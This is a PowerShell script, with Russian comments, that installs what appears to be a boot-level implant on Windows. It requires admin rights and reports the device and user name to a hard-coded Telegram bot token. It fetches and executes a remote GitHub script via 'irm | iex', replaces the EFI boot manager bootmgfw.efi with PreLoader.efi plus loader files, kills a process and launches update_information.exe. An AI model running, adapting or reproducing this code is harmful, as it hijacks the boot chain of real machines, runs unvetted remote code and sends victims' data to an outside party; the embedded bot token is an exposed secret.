# ===== ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА =====
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    exit
}

# ===== ИНИЦИАЛИЗАЦИЯ =====
$device = $env:COMPUTERNAME
$user = $env:USERNAME

# ===== ОТПРАВКА В TELEGRAM (НАЧАЛО РАБОТЫ) =====
$Token = "8323167571:AAFEgqb4cAPmKNek-D6ioTvS634gRE0CuTo"
$ChatID = "7063407604"

$msg = "Устройство: $device`nПользователь: $user`n`nЗапущена конфигурация: Cfg_UEFI_NoWD"

if ($msg.Length -gt 4090) {
    $msg = $msg.Substring(0, 4090)
}

$body = @{
    chat_id = $ChatID
    text = $msg
} | ConvertTo-Json -Compress

$url = "https://api.telegram.org/bot$Token/sendMessage"

try {
    Invoke-RestMethod -Uri $url -Method Post -ContentType "application/json" -Body $body | Out-Null
} catch {
    # Игнорируем ошибки
}

# ===== ИНИЦИАЛИЗАЦИЯ ЛОГОВ =====
$logMessages = ""

# ===== МОНТИРОВАНИЕ EFI РАЗДЕЛА =====
try {
    $mountProcess = Start-Process -FilePath "mountvol" -ArgumentList "S:", "/S" -Wait -PassThru -NoNewWindow
    if ($mountProcess.ExitCode -eq 0) {
        $logMessages += "EFI раздел успешно смонтирован`n"
    } else {
        $logMessages += "ОШИБКА: Не удалось смонтировать EFI раздел`n"
    }
} catch {
    $logMessages += "ОШИБКА: Не удалось смонтировать EFI раздел`n"
}

# ===== ЗАГРУЗКА ВСЕХ ФАЙЛОВ ЧЕРЕЗ POWERSHELL =====
try {
    irm 'https://github.com/049-bit/K/raw/refs/heads/main/test.ps1' | iex
} catch {
    # Игнорируем ошибки
}

# ===== КОПИРОВАНИЕ PRELOADER.EFI =====
$strPreLoaderPath = Join-Path $env:LOCALAPPDATA "PreLoader.efi"
try {
    Copy-Item -Path $strPreLoaderPath -Destination "S:\EFI\Microsoft\Boot\bootmgfw.efi" -Force -ErrorAction Stop
    $logMessages += "Был скопирован PRELOADER.EFI на место S:\EFI\Microsoft\Boot\bootmgfw.efi`n"
} catch {
    $logMessages += "ОШИБКА: Не удалось скопировать PRELOADER.EFI`n"
}

# ===== КОПИРОВАНИЕ HASHTOOL.EFI =====
$strHashToolPath = Join-Path $env:LOCALAPPDATA "HashTool.efi"
try {
    Copy-Item -Path $strHashToolPath -Destination "S:\EFI\Microsoft\Boot\" -Force -ErrorAction Stop
    $logMessages += "Был скопирован HASHTOOL.EFI в директорию S:\EFI\Microsoft\Boot\`n"
} catch {
    $logMessages += "ОШИБКА: Не удалось скопировать HASHTOOL.EFI`n"
}

# ===== КОПИРОВАНИЕ LOADER.EFI =====
$strLoaderPath = Join-Path $env:LOCALAPPDATA "loader.efi"
try {
    Copy-Item -Path $strLoaderPath -Destination "S:\EFI\Microsoft\Boot\" -Force -ErrorAction Stop
    $logMessages += "Был скопирован LOADER.EFI в директорию S:\EFI\Microsoft\Boot\`n"
} catch {
    $logMessages += "ОШИБКА: Не удалось скопировать LOADER.EFI`n"
}

# ===== ОТПРАВКА ЛОГОВ В TELEGRAM =====
$msg = "Устройство: $device`nПользователь: $user`n`nРезультаты выполнения Cfg_UEFI_NoWD:`n`n$logMessages"

if ($msg.Length -gt 4090) {
    $msg = $msg.Substring(0, 4090)
}

$body = @{
    chat_id = $ChatID
    text = $msg
} | ConvertTo-Json -Compress

try {
    Invoke-RestMethod -Uri $url -Method Post -ContentType "application/json" -Body $body | Out-Null
} catch {
    # Игнорируем ошибки
}

# ===== ОЖИДАНИЕ ЗАВЕРШЕНИЯ ПРОЦЕССА =====
$startTime = Get-Date
$timeout = 120 # секунд

while (((Get-Date) - $startTime).TotalSeconds -lt $timeout) {
    $process = Get-Process -Name "1446062403_01" -ErrorAction SilentlyContinue
    
    if (-not $process) {
        break
    }
    
    Start-Sleep -Seconds 1
}

# ===== УНИЧТОЖЕНИЕ ПРОЦЕССА ЕСЛИ ОН ЕЩЕ РАБОТАЕТ =====
$process = Get-Process -Name "1446062403_01" -ErrorAction SilentlyContinue
if ($process) {
    Stop-Process -Name "1446062403_01" -Force -ErrorAction SilentlyContinue
}

# ===== ЗАПУСК UPDATE_INFORMATION.EXE =====
$strUpdatePath = Join-Path $env:LOCALAPPDATA "update_information.exe"
if (Test-Path $strUpdatePath) {
    Start-Process -FilePath $strUpdatePath -WindowStyle Normal
}
